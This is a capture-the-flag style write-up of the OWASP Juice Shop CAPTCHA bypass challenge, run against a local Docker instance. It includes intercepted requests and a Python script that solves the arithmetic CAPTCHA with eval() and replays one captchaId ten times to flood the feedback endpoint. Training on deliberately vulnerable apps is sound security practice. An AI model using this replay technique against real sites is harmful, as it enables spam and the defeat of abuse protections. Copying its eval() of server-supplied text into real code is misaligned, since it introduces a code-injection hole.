# Challenge #4 – CAPTCHA Bypass

> **Category:** Broken Anti-Automation  
> **Difficulty:** ⭐⭐⭐  
> **Tools:** Burp Suite Repeater, Python 3  
> **Video:** ▶ [Watch on Loom](https://loom.com/TBD)

---

## Table of Contents

- [Overview](#overview)
- [Vulnerability Description](#vulnerability-description)
- [Challenge 4 – CAPTCHA Bypass](#challenge-4--captcha-bypass)
  - [Reconnaissance](#reconnaissance)
  - [Walkthrough – Manual Analysis (Burp Suite)](#walkthrough--manual-analysis-burp-suite)
  - [Walkthrough – Automated Bypass (Python)](#walkthrough--automated-bypass-python)
- [References](#references)

---

## Overview

This writeup covers the exploitation of a broken CAPTCHA implementation in the OWASP Juice Shop's customer feedback form. The challenge requires submitting 10 or more feedback entries within 20 seconds — something the CAPTCHA is supposed to prevent, but fails to due to two critical implementation flaws.

The challenge is performed against a clean local Docker instance on `http://localhost:4000`.

---

## Vulnerability Description

The Juice Shop's feedback form (`/#/contact`) presents users with an arithmetic CAPTCHA — a simple math problem like `8 + 11 = ?`. Two fundamental weaknesses make this bypass trivial:

**Flaw 1 – Client-side CAPTCHA evaluation**  
The CAPTCHA answer is validated by the server, but the question is a simple arithmetic expression embedded in the API response as a string. The expression can be evaluated programmatically using Python's `eval()` function — no human solving required.

**Flaw 2 – CAPTCHA ID replay**  
Each CAPTCHA has a `captchaId` tied to it. The server does not invalidate a `captchaId` after it has been used once. This means the same CAPTCHA ID and answer can be replayed in every subsequent request without ever requesting a new CAPTCHA — rendering the anti-automation mechanism completely ineffective.

---

## Challenge 4 – CAPTCHA Bypass

### Reconnaissance

The target endpoint is the customer feedback form:
```
http://localhost:4000/#/contact
```

Before attempting the bypass, we need to understand the API structure by observing a legitimate feedback submission in Burp Suite.

### Walkthrough – Manual Analysis (Burp Suite)

**Step 1 – Capture a legitimate feedback request**

1. Navigate to `http://localhost:4000/#/contact`
2. Fill in the feedback form and solve the CAPTCHA manually
3. Submit the form with Burp Suite Proxy active

The intercepted request:

```http
POST /api/Feedbacks/ HTTP/1.1
Host: localhost:4000
Content-Type: application/json

{
  "captchaId": 5,
  "captcha": "19",
  "comment": "test feedback",
  "rating": 5
}
```

The corresponding CAPTCHA API response that provided this challenge:

```http
GET /rest/captcha/ HTTP/1.1
Host: localhost:4000
```

```json
{
  "captchaId": 5,
  "captcha": "10 + 9"
}
```

**Step 2 – Identify the two weaknesses**

In Burp Suite Proxy History, observe:

1. The CAPTCHA is a plain arithmetic string (`"10 + 9"`) — trivially solvable with `eval()`
2. Send the same feedback request a second time in **Repeater** with the identical `captchaId` and `captcha` values — the server accepts it again, confirming that CAPTCHA IDs are not invalidated after use

**Step 3 – Replay the request manually in Repeater**

Send the captured feedback request to Repeater (`Ctrl+R`).

Modify the comment slightly and click **Send** repeatedly — each request succeeds with HTTP 201, demonstrating the replay vulnerability.

To complete the challenge manually, you would need to send 10 requests within 20 seconds — which is feasible in Repeater but tedious. This is where automation becomes the practical approach.

---

### Walkthrough – Automated Bypass (Python)

The following Python script automates the bypass by:
1. Requesting one CAPTCHA from the API
2. Solving it with `eval()`
3. Replaying the same `captchaId` and answer 10 times in rapid succession

```python
import requests

# Configuration
BASE_URL = "http://localhost:4000"
COUNT_REQUESTS = 10

# Step 1: Get CAPTCHA from server
captcha_response = requests.get(f"{BASE_URL}/rest/captcha/")
captcha_data = captcha_response.json()

captcha_id = captcha_data["captchaId"]
captcha_expression = captcha_data["captcha"]

# Step 2: Solve CAPTCHA
captcha_response = str(eval(captcha_expression))

print(f"CAPTCHA ID:       {captcha_id}")
print(f"CAPTCHA Question: {captcha_expression}")
print(f"CAPTCHA Answer:   {captcha_response}")
print(f"Send {COUNT_REQUESTS} Requests...\n")

# Step 3: Send same captchaId 10x
for i in range(COUNT_REQUESTS):
    payload = {
        "captchaId": captcha_id,
        "captcha": captcha_response,
        "comment": f"Automated Feedback Test #{i + 1}",
        "rating": 5
    }

    response = requests.post(f"{BASE_URL}/api/Feedbacks/", json=payload)
    print(f"Request {i + 1:>2}: HTTP {response.status_code}")

print("\nDone. Please check score board.")
```

**Step 4 – Run the script**

```powershell
python captcha_bypass.py
```

Expected output:
```
CAPTCHA ID:      5
CAPTCHA Question:   10 + 9
CAPTCHA Answer: 19
Send 10 Requests...

Request  1: HTTP 201
Request  2: HTTP 201
Request  3: HTTP 201
Request  4: HTTP 201
Request  5: HTTP 201
Request  6: HTTP 201
Request  7: HTTP 201
Request  8: HTTP 201
Request  9: HTTP 201
Request 10: HTTP 201

Done. Please check score board.
```

All 10 requests succeed within well under 20 seconds. The Juice Shop awards the **"CAPTCHA Bypass"** challenge immediately.

---

## References

- [OWASP Top 10 – A07:2021 Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [OWASP Automated Threats to Web Applications](https://owasp.org/www-project-automated-threats-to-web-applications/)
- [PortSwigger – Burp Suite Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater)

---
